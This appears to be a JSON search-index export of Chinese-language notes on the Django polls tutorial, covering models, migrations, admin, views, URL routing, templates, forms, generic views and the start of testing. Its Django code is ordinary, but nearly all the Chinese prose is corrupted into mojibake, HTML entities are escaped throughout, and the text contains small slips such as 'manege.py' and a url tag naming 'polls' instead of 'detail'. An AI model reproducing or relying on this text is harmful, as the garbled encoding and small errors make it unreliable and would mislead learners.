æ–¹å¼ã€‚ä¸€ä¸ªæ¨¡å‹å¯¹è±¡å¯¹åº”ä¸€ä¸ªè¡¨æ ¼ï¼Œå¯¹è±¡æ•°æ®æˆå‘˜å³ä¸ºè¡¨æ ¼å±æ€§ã€‚\næˆ‘ä»¬å°è¯•åœ¨ polls åº”ç”¨ä¸­æ–°å»ºä¸¤ä¸ªåä¸º Question å’Œ Choice çš„æ¨¡å‹ã€‚åœ¨ polls/models.py ä¸­ä½¿ç”¨ä¸¤ä¸ª Python çš„ç±»è¡¨ç¤ºï¼Œå¦‚ä¸‹ä»£ç éå¸¸ç›´ç™½ï¼š\nfrom django.db import models  class Question(models.Model):  question_text = models.CharField(max_length=200)  pub_date = models.DateTimeField(\u0026#39;date published\u0026#39;)  class Choice(models.Model):  question = models.ForeignKey(Question, on_delete=models.CASCADE)  choice_text = models.CharField(max_length=200)  votes = models.IntegerField(default=0) Activating models #  é€šè¿‡ models ï¼Œå¯ä»¥ç›´æ¥åœ¨æ•°æ®åº“ä¸­åˆ›å»ºè¡¨æ ¼ æˆ– æ“ä½œæ•°æ®åº“ä¸­çš„æ•°æ®ã€‚ä½†é¦–å…ˆæˆ‘ä»¬éœ€è¦å‘Šè¯‰ Djangoï¼Œè¯¥ polls åº”ç”¨å·²ç»å®‰è£…åœ¨äº†æˆ‘ä»¬çš„é¡¹ç›®ä¸­ã€‚\nä¸ºäº†å°†æˆ‘ä»¬çš„ apps åŠ å…¥åˆ°æˆ‘ä»¬çš„é¡¹ç›®ï¼Œæˆ‘ä»¬éœ€è¦æ›´æ”¹ mysites/settings.py ä¸­çš„ INSTALLED_APPS è®¾ç½®ã€‚Polls çš„é…ç½®æ–‡ä»¶åœ¨ polls/apps.py æ–‡ä»¶çš„ PollsConfig ä¸­ï¼Œæ‰€ä»¥ mysite/settings.py æ›´æ”¹å¦‚ä¸‹ï¼š\nINSTALLED_APPS = [  \u0026#39;polls.apps.PollsConfig\u0026#39;,  \u0026#39;django.contrib.admin\u0026#39;,  \u0026#39;django.contrib.auth\u0026#39;,  \u0026#39;django.contrib.contenttypes\u0026#39;,  \u0026#39;django.contrib.sessions\u0026#39;,  \u0026#39;django.contrib.messages\u0026#39;,  \u0026#39;django.contrib.staticfiles\u0026#39;, ] ç°åœ¨ Django çŸ¥é“äº†éœ€è¦æ·»åŠ  polls è¿™ä¸ªåº”ç”¨ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å»ºç«‹æˆ‘ä»¬åˆ›å»ºçš„ models å¯¹åº”çš„æ•°æ®åº“ï¼š\n$ python manage.py makemigrations polls å› ä¸ºåœ¨ Django ä¸­å†™çš„åº”ç”¨æœ‰ç€å¾ˆå¼ºçš„ç§»æ¤æ€§ï¼Œåœ¨ä¸€ä¸ªé¡¹ç›®ä¸­å†™çš„åº”ç”¨å¯ä»¥è½»æ¾ç§»æ¤åˆ°å…¶ä»–åº”ç”¨ä¸Šï¼Œæ‰€ä»¥ Django æä¾›äº†ä»¥ä¸Šçš„å‘½ä»¤é‡æ–°å®‰è£…ç§»æ¤çš„å‘½ä»¤ â†’ æ‰€ä»¥ä»¥ä¸Šæ‰§è¡Œ makemigrations polls å‘½ä»¤å°±æ˜¯æŠŠ polls è¿™ä¸ªåº”ç”¨ç§»æ¤åˆ°æœ¬é¡¹ç›®ï¼Œå¹¶è¿›è¡Œåˆ›å»ºæ•°æ®åº“ã€‚\nDjango ä¼šå°†æ”¹å˜ä¹‹åçš„å†…å®¹å­˜å‚¨åœ¨ migration ä¸­ï¼Œå¯ä»¥åœ¨ polls/migrations/0001_initial.py è¿™ä¸ªæ–‡ä»¶ä¸­çœ‹åˆ°æ•°æ®åº“çš„è¡¨æ ¼çš„åˆ›å»ºæ–¹å¼ã€‚\nä»¥ä¸‹ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œ polls/migrations/0001_initial.py çš„å†…å®¹ï¼šï¼ˆå›æ˜¾æ‰§è¡Œçš„ sql å‘½ä»¤ï¼‰\n$ python manage.py sqlmigrate polls 0001 å¦‚æœä½ ä¸è¿›è¡Œä»¥ä¸Šçš„è¿å¾™æ“ä½œï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤æŸ¥çœ‹ä¼šå‡ºç°çš„é—®é¢˜ï¼š\n$ python manage.py check æ€»ç»“ï¼šå½“ä½ æ›´æ”¹äº† Django é¡¹ç›®çš„ä¸€ä¸ªæ¨¡å‹åï¼Œä½ éœ€è¦é€šè¿‡ä»¥ä¸‹çš„ä¸‰æ­¥é€‚é…è¿™äº›å˜åŒ–ï¼š\n åˆ›å»ºä¸€ä¸ªæ¨¡å‹ models.py æ‰§è¡Œå‘½ä»¤ python manage.py makemigrationsï¼Œåœ¨ migrations/ ä¸­ç”Ÿæˆæ•°æ®åº“ç”Ÿæˆçš„ä¸­é—´ Python è„šæœ¬ æ‰§è¡Œå‘½ä»¤ python manege.py migrateï¼Œæ‰§è¡Œä¸­é—´ Python è„šæœ¬ï¼Œç”Ÿæˆ/ä¿®æ”¹æ•°æ®åº“ã€‚  PostScriptï¼šä½ å¯ä»¥åœ¨ä¸‹é¢è¿™ä¸ªç½‘ç«™æŸ¥çœ‹å®Œæ•´çš„ manage.py ä½¿ç”¨è¯´æ˜ã€‚\nPostScriptï¼šå¯ä»¥åœ¨ä»¥ä¸‹ç½‘ç«™æŸ¥çœ‹å…³äº Django æ¨¡å‹çš„ä½¿ç”¨ï¼Œä¸­æ–‡ä½¿ç”¨è¯´æ˜ï¼Œå®˜ç½‘ä½¿ç”¨è¯´æ˜ã€‚\nPlaying with API #  ä½¿ç”¨ Django æä¾›çš„ä»¥ä¸‹å‘½ä»¤ï¼Œå¯ä»¥åœ¨è¯¥é¡¹ç›®ä¸‹è¿›å…¥ Python çš„ç”¨æˆ·äº¤äº’ç•Œé¢ï¼Œå¯ä»¥ç”¨äºæµ‹è¯•åˆšæ‰åˆ›å»ºçš„ Question å’Œ Choice æ¨¡å—ï¼š\n$ python manage.py shell ä»¥ä¸‹å‘½ä»¤ï¼Œå¯ä»¥æµ‹è¯• Python æ•°æ®åº“æä¾›çš„ APIï¼š\n\u0026gt;\u0026gt;\u0026gt; from polls.models import Choice, Question # ä»æˆ‘ä»¬å®šä¹‰çš„åº”ç”¨ polls çš„æ¨¡å—ä¸­å¯¼å…¥ Choice å’Œ Question å¯¹è±¡  \u0026gt;\u0026gt;\u0026gt; Question.objects.all() \u0026lt;QuerySet []\u0026gt; # è¿™è¡¨ç¤ºæ•°æ®åº“ä¸­è¿˜æ²¡æœ‰ Question è¿™ä¸ªå¯¹è±¡  \u0026gt;\u0026gt;\u0026gt; from django.utils import timezone  \u0026gt;\u0026gt;\u0026gt; q = Question(question_text=\u0026#34;What\u0026#39;s new?\u0026#34;, pub_date=timezone.now()) # åˆ›å»ºä¸€ä¸ª Question çš„å¯¹è±¡ q, question_text æ˜¯ \u0026#34;What\u0026#39;s new?\u0026#34;  \u0026gt;\u0026gt;\u0026gt; q.save() # å°† q è¿™ä¸ª Question å¯¹è±¡å­˜å‚¨è¿›å…¥æ•°æ®åº“ä¸­  \u0026gt;\u0026gt;\u0026gt; Question.objects.all() \u0026lt;QuerySet [\u0026lt;Question: Question object (1)\u0026gt;]\u0026gt; # æˆ‘ä»¬æ–°åˆ›å»ºäº†ä¸€ä¸ª Question å¯¹è±¡ Django æä¾›çš„æ•°æ®åº“æŸ¥è¯¢æ“ä½œ API ç›¸å…³æ–‡æ¡£ã€‚\nIntroducing the Django Admin #  Creating an admin user #  ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ª admin ç”¨æˆ·ï¼š\n$ python manage.py createsuperuser Starting the development server #  å¦‚åŒä¹‹å‰ä¸€æ ·æŒ‰ç…§ä»¥ä¸‹å‘½ä»¤å¯åŠ¨æœåŠ¡å™¨ï¼š\n$ python manage.py runserver åœ¨æµè§ˆå™¨ä¸­è®¿é—® URLï¼šlocalhost:8000/admin/ï¼Œè¾“å…¥åœ¨ä¸Šä¸€æ­¥ä¸­åˆ›å»ºçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯ä»¥è¿›å…¥ç®¡ç†é¡µé¢ã€‚\nMake the poll app modifiable in the admin #  è¿›å…¥åå‘ç°é¡µé¢ä¸­å¹¶æ²¡æœ‰æ˜¾ç¤ºæˆ‘ä»¬åˆ›å»ºçš„ Question å’Œ Choice å¯¹è±¡ã€‚\nè¿™æ—¶æˆ‘ä»¬éœ€è¦ç¼–è¾‘ polls/admin.py è¿™ä¸ªæ–‡ä»¶ï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š\nfrom django.contrib import admin  # Register your models here. from .models import Question, Choice  admin.site.register(Question) admin.site.register(Choice) è¿™æ—¶åˆ·æ–°æµè§ˆå™¨ï¼Œå³å¯æŸ¥çœ‹ polls ä¸­çš„ Question å’Œ Choice å¯¹è±¡ã€‚\n"},{"id":134,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial03/","title":"Tutorial03","section":"Tutorial","content":"Tutorial03 #  Overview #  Django ä¸­å®šä¹‰äº†ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼Œç§°ä½œ viewï¼Œå®ƒæŠ½è±¡åœ°å¯¹åº”ç€ä¸€ä¸ªç½‘é¡µï¼ŒDjango é€šè¿‡ä¸€ä¸ªå‡½æ•°æ¥æŠ½è±¡è¡¨ç¤ºä¸€ä¸ª viewã€‚åŒæ—¶ Django æä¾›äº†å«åš URLconfs çš„ä¸œè¥¿ï¼Œä¼šå°†ä¸€ä¸ªä¸ª URL æ¨¡å¼å­—ç¬¦ä¸²ä¸€ä¸€å¯¹åº”åˆ°æ¯ä¸€ä¸ª view ä¸­ã€‚\nWriting more view #  æˆ‘ä»¬å¯ä»¥åœ¨ polls/views.py ä¸­åŠ å…¥ä»¥ä¸‹ä»£ç ï¼š\ndef detail(request, question_id):  return HttpResponse(\u0026#34;You\u0026#39;re looking at question %s.\u0026#34; % question_id)  def results(request, question_id):  response = \u0026#34;You\u0026#39;re looking at the results of question %s.\u0026#34;  return HttpResponse(response % question_id)  def vote(request, question_id):  return HttpResponse(\u0026#34;You\u0026#39;re voting on question %s.\u0026#34; % question_id) ç„¶åå°†ä»¥ä¸‹ä»£ç æ·»åŠ åˆ° polls/urls.py æ–‡ä»¶ä¸­ï¼š\nfrom django.urls import path  from . import views  urlpatterns = [  # ex: /polls/  path(\u0026#39;\u0026#39;, views.index, name=\u0026#39;index\u0026#39;),  # ex: /polls/5/  path(\u0026#39;\u0026lt;int:question_id\u0026gt;/\u0026#39;, views.detail, name=\u0026#39;detail\u0026#39;),  # ex: /polls/5/results/  path(\u0026#39;\u0026lt;int:question_id\u0026gt;/results/\u0026#39;, views.results, name=\u0026#39;results\u0026#39;),  # ex: /polls/5/vote/  path(\u0026#39;\u0026lt;int:question_id\u0026gt;/vote/\u0026#39;, views.vote, name=\u0026#39;vote\u0026#39;), ] æ³¨æ„å…¶ä¸­ \u0026lt;int:question_id\u0026gt; è¿™ä¸€éƒ¨åˆ†ï¼š\n \u0026lt;int: è¿™ä¸€éƒ¨åˆ†å°† URL ä¸­çš„è¯·æ±‚éƒ¨åˆ†è½¬åŒ–æˆæŒ‡å®šçš„ç±»å‹ï¼ŒåŒæ—¶å†³å®šæŒ‡å‘çš„æ¨¡å¼å­—ç¬¦ä¸²ã€‚ :question_id\u0026gt; è¿™ä¸€éƒ¨åˆ†ç»™å®šåŒ¹é…çš„æ¨¡å¼å­—ç¬¦ä¸²ä¸€ä¸ªå˜é‡åã€‚  PostScriptï¼šä¸å»ºè®®æ„šè ¢åœ°å°†åƒ .html ä¸€æ ·çš„ URL cruft æ·»åŠ åˆ° path ä¸­ï¼Œæ¯”å¦‚ï¼š\npath(\u0026#39;polls/latest.html\u0026#39;, views.index) Write views that actually do something #  æ¯ä¸ª views ä¸»è¦å®Œæˆä¸¤ä»¶äº‹æƒ…ï¼šè¿”å›åŒ…å«æ‰€è¯·æ±‚é¡µé¢å†…å®¹çš„ HttpRsponse å¯¹è±¡ï¼Œæˆ–è¿”å›å¼‚å¸¸ã€‚\næˆ‘ä»¬åœ¨ polls/views.py ä¸­å®Œæˆä»¥ä¸‹çš„äº‹æƒ…ï¼ˆæ ¹æ®å‘å¸ƒçš„æ—¥æœŸæ˜¾ç¤ºç³»ç»Ÿä¸­çš„æœ€æ–°çš„ 5 ä¸ªæŠ•ç¥¨é—®é¢˜ï¼‰ï¼š\nfrom django.http import HttpResponse from .models import Question  def index(request):  latest_question_list = Question.objects.order_by(\u0026#39;-pub_date\u0026#39;)[:5]  output = \u0026#39;, \u0026#39;.join([q.question_text for q in latest_question_list])  return HttpResponse(output) è¿™æ ·çš„è¿”å› Http æ˜¯ç¡¬æ ¸ç¼–ç åœ¨ Python ä»£ç ä¸­çš„ï¼Œä¸ºäº†ä½¿å‰ç«¯ä»£ç ä¸ Python çš„åç«¯ä»£ç åˆ†ç¦»ï¼Œæˆ‘ä»¬éœ€è¦åœ¨åº”ç”¨ä¸­åˆ›å»ºä¸€ä¸ª templates çš„å­ç›®å½•ï¼Œè¿›è¡Œæ¸²æŸ“å·¥ä½œçš„ DjangoTemplates ä¼šåœ¨æ¯ä¸ª INSTALLED_APPS ä¸­å¯»æ‰¾ä¸€ä¸ª templates çš„å­ç›®å½•ã€‚\næ‰€ä»¥æˆ‘ä»¬åˆ›å»ºç›®å½•ä»¥åŠæ–‡ä»¶ polls/templates/polls/index.htmlï¼Œå¹¶ä¸”å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š\n{% if latest_question_list %}  \u0026lt;ul\u0026gt;  {% for question in latest_question_list %}  \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/polls/{{ question.id }}/\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;  {% endfor %}  \u0026lt;/ul\u0026gt; {% else %}  \u0026lt;p\u0026gt;No polls are available.\u0026lt;/p\u0026gt; {% endif %} å°† polls/views.pyï¼Œæ›´æ”¹æˆä»¥ä¸‹å†…å®¹ï¼š\nfrom django.http import HttpResponse from django.template import loader  from .models import Question  def index(request):  latest_question_list = Question.objects.order_by(\u0026#39;-pub_date\u0026#39;)[:5]  template = loader.get_template(\u0026#39;polls/index.html\u0026#39;)  context = {  \u0026#39;latest_question_list\u0026#39;: latest_question_list,  }  return HttpResponse(template.render(context, request)) ä¸»è¦åˆ°ä»£ç çš„æœ€åä¸€è¡Œï¼šåŠ è½½æ¨¡æ¿ï¼ŒPython æ¸²æŸ“ï¼Œè¿”å› Http å“åº” â†’ æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„åŠŸèƒ½ï¼ŒDjango å°†è¿™ä¸‰ä¸ªåŠŸèƒ½é›†æˆåˆ°äº†ä¸€èµ·å½¢æˆäº†ä¸€ä¸ª shortcutï¼Œå³å¯ä»¥ç”¨ä»¥ä¸‹ç®€åŒ–çš„ä»£ç è¡¨ç¤ºï¼š\nfrom django.shortcuts import render  from .models import Question  def index(request):  latest_question_list = Question.objects.order_by(\u0026#39;-pub_date\u0026#39;)[:5]  context = {\u0026#39;latest_question_list\u0026#39;: latest_question_list}  return render(request, \u0026#39;polls/index.html\u0026#39;, context) Raising a 404 error #  Django å®šä¹‰äº†ä¸€ä¸ªè¿”å› 404 é”™è¯¯ç çš„æ¨¡å—ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼å¯¼å…¥ï¼š\nfrom django.http import Http404 åœ¨åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨æŠ›å‡ºå¼‚å¸¸çš„æ–¹å¼ä½¿ç”¨å¯¼å…¥çš„ Http404ï¼Œå¦‚ä¸‹ï¼š\nraise Http404(\u0026#34;This is a 404 error!\u0026#34;) ä¸€ä¸ªå®é™…çš„åº”ç”¨åœºæ™¯å¦‚ä¸‹ï¼š\nfrom django.http import Http404 from django.shortcuts import render  from .models import Question # ... def detail(request, question_id):  try:  question = Question.objects.get(pk=question_id)  except Question.DoesNotExist:  raise Http404(\u0026#34;Question does not exist\u0026#34;)  return render(request, \u0026#39;polls/detail.html\u0026#39;, {\u0026#39;question\u0026#39;: question}) è¿™æ®µä»£ç çš„æ„æ€æ˜¯ï¼Œä» Question å¯¹åº”çš„æ‰€æœ‰å¯¹è±¡ä¸­å¯»æ‰¾ä¸€ä¸ª pk=quesition_id çš„å¯¹è±¡ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™æŠ›å‡º Http404 çš„å¼‚å¸¸ã€‚\nè¿™ä¸ªåŠŸèƒ½æ¯”è¾ƒå¸¸ç”¨ï¼Œå› æ­¤ Django æä¾›äº†ä¸€ä¸ª shortcutï¼šget_object_or_404ã€‚ä¸€ä¸ªå®ä¾‹ä»£ç å¦‚ä¸‹ï¼š\nfrom django.shortcuts import get_object_or_404, render  from .models import Question # ... def detail(request, question_id):  question = get_object_or_404(Question, pk=question_id)  return render(request, \u0026#39;polls/detail.html\u0026#39;, {\u0026#39;question\u0026#39;: question}) è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„ shortcut å‡½æ•°ä¸ºï¼šget_list_or_404\nRemoving hardcodeed URLs in templates #  åœ¨ä¹‹å‰ç¼–å†™çš„ html æ¨¡æ¿æ–‡ä»¶ä¸­ï¼Œhref æŒ‡å‘çš„ url å‡ºç°äº†ç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²çš„ç¡¬ç¼–ç æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„æ–¹å¼æ›¿æ¢è¿™ç§å†™æ³•ï¼š\n\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;{% url \u0026#39;polls\u0026#39; question.id %}\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;!-- åŸæ¥çš„å†™æ³•ï¼š \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/polls/{{ question.id }}/\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; --!\u0026gt; è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå°†è¿™ä¸ª href ä¸ urlpatterns ä¸­å¯¹åº”çš„æ¨¡å¼å­—ç¬¦ä¸²è¿æ¥èµ·æ¥ï¼Œä»–ä»¬çš„ä»»ä½•æ”¹å˜ä¼šç›¸äº’å½±å“ã€‚\nNamespacing URL names #  åœ¨å®é™…çš„é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨è®¸è®¸å¤šå¤šçš„åº”ç”¨ï¼Œé‚£ä¹ˆä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•å¦‚ä½•çŸ¥é“ URL æŒ‡å‘é‚£ä¸ªåº”ç”¨å‘¢ï¼Ÿ\nåœ¨åº”ç”¨çš„ urls.py è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œå¯ä»¥åœ¨ urlpattern åˆ—è¡¨å®šä¹‰ä¹‹å‰ï¼ŒåŠ å…¥ï¼š\napp_name = \u0026#39;polls\u0026#39; äºæ˜¯ï¼Œå¯ä»¥å¯¹å°†åº”ç”¨æ¨¡æ¿æ”¹æˆå¦‚ä¸‹å½¢å¼ï¼š\n\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;{% url \u0026#39;polls:detail\u0026#39; question.id %}\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;!-- åŸæ¥çš„å†™æ³•ï¼š \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;{% url \u0026#39;detail\u0026#39; question.id %}\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; --!\u0026gt; "},{"id":135,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial04/","title":"Tutorial04","section":"Tutorial","content":"Tutorial04 #  Write a simple form #  æˆ‘ä»¬å¯ä»¥åœ¨ä¹‹å‰ç¼–å†™çš„ html æ–‡ä»¶çš„æ¨¡æ¿ä¸­åŠ å…¥ \u0026lt;form\u0026gt; å…ƒç´ ï¼Œä»¥ä¾¿æˆ‘ä»¬åç»­çš„ç ”ç©¶ï¼š\n\u0026lt;h1\u0026gt;{{ question.question_text }}\u0026lt;/h1\u0026gt;  {% if error_message %}\u0026lt;p\u0026gt;\u0026lt;strong\u0026gt;{{ error_message }}\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt;{% endif %}  \u0026lt;form action=\u0026#34;{% url \u0026#39;polls:vote\u0026#39; question.id %}\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; {% csrf_token %} {% for choice in question.choice_set.all %}  \u0026lt;input type=\u0026#34;radio\u0026#34; name=\u0026#34;choice\u0026#34; id=\u0026#34;choice{{ forloop.counter }}\u0026#34; value=\u0026#34;{{ choice.id }}\u0026#34;\u0026gt;  \u0026lt;label for=\u0026#34;choice{{ forloop.counter }}\u0026#34;\u0026gt;{{ choice.choice_text }}\u0026lt;/label\u0026gt;\u0026lt;br\u0026gt; {% endfor %} \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Vote\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; ä»¥ä¸Šçš„ä»£ç å¤§è‡´æ„æ€æ˜¯åœ¨æäº¤è¡¨å•åï¼Œä¼šè¿æ¥åˆ° polls è¿™ä¸ªåº”ç”¨ä¸­ï¼Œåä¸º vote çš„ urlpatternï¼Œå› æ­¤ä½ éœ€è¦åœ¨æ–‡ä»¶ User/urls.py è¿™ä¸ªæ–‡ä»¶ä¸­ä¸º urlpattern æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š\npath(\u0026#39;\u0026lt;int:question_id\u0026gt;/vote/\u0026#39;, views.vote, name=\u0026#39;vote\u0026#39;), ç„¶åå¯ä»¥åœ¨ html ä»£ç ä¸­æ³¨æ„åˆ°ï¼Œåœ¨é“¾æ¥åˆ° url æ—¶ï¼Œè¿˜ä¼ é€’äº†ä¸€ä¸ªå‚æ•° question.idï¼Œè¿™ä¸ªå‚æ•°ä¼šè¢« urlpattern æŒ‡å‘çš„å‡½æ•°ä½œä¸ºä¼ é€’å‚æ•°ï¼Œä»¥ä¸‹ä¸º vote å‡½æ•°å®ä¾‹ï¼š\nfrom django.http import HttpResponse, HttpResponseRedirect from django.shortcuts import get_object_or_404, render from django.urls import reverse  from .models import Choice, Question # ... def vote(request, question_id):  question = get_object_or_404(Question, pk=question_id)  try:  selected_choice = question.choice_set.get(pk=request.POST[\u0026#39;choice\u0026#39;])  except (KeyError, Choice.DoesNotExist):  return render(request, \u0026#39;polls/detail.html\u0026#39;, {  \u0026#39;question\u0026#39;: question,  \u0026#39;error_message\u0026#39;: \u0026#34;You didn\u0026#39;t select a choice.\u0026#34;,  })  else:  selected_choice.votes += 1  selected_choice.save()  # æ¯æ¬¡å¤„ç† POST æ•°æ®æ—¶ï¼Œéƒ½åº”å½“ä½¿ç”¨ HttpResponseRedirect è¿™ä¸ªå‡½æ•°  # å› ä¸ºæœ‰æ—¶ç”¨æˆ·ä¸åœç‚¹å‡»æŒ‰é”®ä¼šå‘é€å¤šæ¬¡è¯·æ±‚  return HttpResponseRedirect(reverse(\u0026#39;polls:results\u0026#39;, args=(question.id,))) PostScriptï¼šè¿™ä¸ªä»£ç å…¶å®æ˜¯å­˜åœ¨é—®é¢˜çš„ï¼Œæ¯”å¦‚ä¸¤ä¸ªç”¨æˆ·åŒæ—¶è®¿é—®æˆ‘ä»¬çš„é¡µé¢ï¼ŒåŒæ—¶è¿›è¡ŒæŠ•ç¥¨åæˆ‘ä»¬çš„æ•°æ®åº“ä¸­çš„ vote åªå¢åŠ äº†ä¸€ç¥¨ï¼Œè€Œå®é™…ä¸Šåº”è¯¥å¢åŠ ä¸¤ç¥¨ï¼Œè¿™ä¸€ç‚¹è¢«ç§°ä½œ ç«äº‰æ¡ä»¶ (race condition)ï¼ŒæŸ¥çœ‹è§£å†³æ–¹æ³•ã€‚\nUse generic views: Less code is better #  ä¹‹å‰æˆ‘ä»¬åšçš„è®¸å¤šå·¥ä½œéƒ½åœ¨å®Œæˆè¿™æ ·ä¸€ä»¶äº‹æƒ…ï¼šé€šè¿‡ç”¨æˆ·è®¿é—®çš„ URL ä»æ•°æ®åº“ä¸­æå–æ•°æ®ï¼Œå¹¶ä¸”æ¸²æŸ“ç›¸åº”çš„ html æ¨¡æ¿ã€‚è®¸å¤š WEB ç³»ç»Ÿä¸­éƒ½ä¼šå®Œæˆè¿™ä¸€é¡¹åŠŸèƒ½ï¼Œæ‰€ä»¥ Django æä¾›äº†ä¸€ä¸ª shortcut æ¥é›†æˆåœ°å®Œæˆè¿™äº›åŠŸèƒ½ï¼Œç§°ä½œ é€šç”¨è§†å›¾ (generic views)ã€‚\nAmend URLconf #  é¦–å…ˆï¼ŒæŠŠ polls/urls.py æ–‡ä»¶ä¿®æ”¹æˆå¦‚ä¸‹å½¢å¼ï¼š\nfrom django.urls import path  from . import views  app_name = \u0026#39;polls\u0026#39; urlpatterns = [  path(\u0026#39;\u0026#39;, views.IndexView.as_view(), name=\u0026#39;index\u0026#39;),  path(\u0026#39;\u0026lt;int:pk\u0026gt;/\u0026#39;, views.DetailView.as_view(), name=\u0026#39;detail\u0026#39;),  path(\u0026#39;\u0026lt;int:pk\u0026gt;/results/\u0026#39;, views.ResultsView.as_view(), name=\u0026#39;results\u0026#39;),  path(\u0026#39;\u0026lt;int:question_id\u0026gt;/vote/\u0026#39;, views.vote, name=\u0026#39;vote\u0026#39;), ] Amend views #  ç„¶åï¼ŒæŠŠ polls/views.py æ–‡ä»¶ä¿®æ”¹æˆå¦‚ä¸‹å½¢å¼ï¼š\nfrom django.http import HttpResponseRedirect from django.shortcuts import get_object_or_404, render from django.urls import reverse from django.views import generic  from .models import Choice, Question   class IndexView(generic.ListView):  template_name = \u0026#39;polls/index.html\u0026#39;  context_object_name = \u0026#39;latest_question_list\u0026#39;   def get_queryset(self):  \u0026#34;\u0026#34;\u0026#34;Return the last five published questions.\u0026#34;\u0026#34;\u0026#34;  return Question.objects.order_by(\u0026#39;-pub_date\u0026#39;)[:5]   class DetailView(generic.DetailView):  model = Question  template_name = \u0026#39;polls/detail.html\u0026#39;   class ResultsView(generic.DetailView):  model = Question  template_name = \u0026#39;polls/results.html\u0026#39;   def vote(request, question_id):  ... # same as above, no changes needed. ä¸Šé¢çš„æ›´æ”¹ç®€è€Œè¨€ä¹‹æ˜¯å°†å‡½æ•°å¼ç¼–ç¨‹ï¼Œé‡ç»„æˆäº†é¢å‘å¯¹è±¡å¼ç¼–ç¨‹ã€‚æ³¨æ„åˆ°å…¶ä¸­çš„å¯¹è±¡æ´¾ç”Ÿè‡ª generic.ListView ä¸ generic.DetailViewï¼Œè¿™ä¸¤ä¸ªç³»ç»Ÿå¯¹è±¡åˆ†åˆ«æŠ½è±¡å‡º â€æ˜¾ç¤ºå¯¹è±¡åˆ—è¡¨â€œ å’Œ â€æ˜¾ç¤ºç‰¹å®šç±»å‹å¯¹è±¡çš„è¯¦ç»†ç•Œé¢â€œã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼ŒDetailView è¿™ä¸ªè§†å›¾ä¼šä½¿ç”¨ \u0026lt;app_name\u0026gt;/\u0026lt;model_name\u0026gt;_detail.html è¿™ä¸ªå‰ç«¯æ¨¡æ¿ã€‚\nåŒç† ListView ä¹Ÿä¼šä½¿ç”¨ \u0026lt;app_name\u0026gt;/\u0026lt;model_name\u0026gt;_list.html è¿™ä¸ªæ¨¡æ¿ã€‚\nå®Œæ•´çš„é€šç”¨è§†å›¾ä½¿ç”¨æ–¹æ³•ï¼Œå¯ä»¥æŸ¥çœ‹è¯´æ˜æ–‡æ¡£ã€‚\n"},{"id":136,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial05/","title":"Tutorial05","section":"Tutorial","content":"Tutorial05 #  Introducing automated testing #  è‡ªåŠ¨åŒ–æµ‹è¯•ï¼š\n æµ‹è¯•å¯ä»¥èŠ‚çœä½ çš„æ—¶é—´ æµ‹è¯•ä¸ä»…ä»…å¯ä»¥å‘ç°é—®é¢˜ï¼Œè¿˜èƒ½é˜²æ­¢é—®é¢˜ æµ‹è¯•ä½¿ä½ çš„ä»£ç æ›´å—æ¬¢è¿ æµ‹è¯•æœ‰åŠ©äºå›¢é˜Ÿåˆä½œ  Writing our first test #  1. identify a bug #  onfirm the bug by using the shell to check the method on a question whose date lies in the future:\n$ python manage.py shell \u0026gt;\u0026gt;\u0026gt; import datetime \u0026gt;\u0026gt;\u0026gt; from django.utils import timezone \u0026gt;\u0026gt;\u0026gt; from polls.models import Question \u0026gt;\u0026gt;\u0026gt; # create a Question instance with pub_date 30 days in the future \u0026gt;\u0026gt;\u0026gt; future_question = Question(pub_date=timezone.now() + datetime.timedelta(days=30)) \u0026gt;\u0026gt;\u0026gt; # was it published recently? \u0026gt;\u0026gt;\u0026gt; future_question.was_published_recently() True 2. create a test to expose the bug #  é€šå¸¸ï¼Œæˆ‘ä»¬ä¼šæŠŠæµ‹è¯•ä»£ç 